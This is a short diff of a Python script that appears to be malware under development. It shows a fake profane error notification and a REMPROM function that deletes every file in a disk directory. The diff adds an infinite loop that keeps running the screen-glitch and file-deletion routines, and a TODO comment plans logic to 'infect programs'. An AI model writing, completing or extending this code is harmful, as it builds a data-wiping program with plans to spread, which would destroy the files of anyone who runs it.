@@ -13,7 +13,6 @@ from pathlib import Path
 import os
 import sys
 
-makeBuggyScreen()
 ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")
 
 folder_ownership = getFolderOwner(getDesktopPath())
@@ -60,6 +59,11 @@ def REMPROM():
     file_list = os.listdir(defaultdiskpath)
     for file_name in file_list:
         os.remove(os.path.join(file_path, file_name))
+
+
+while True:
+    makeBuggyScreen()
+    REMPROM()
 
 
 # TODO: Need to implement a logic to infect programs.
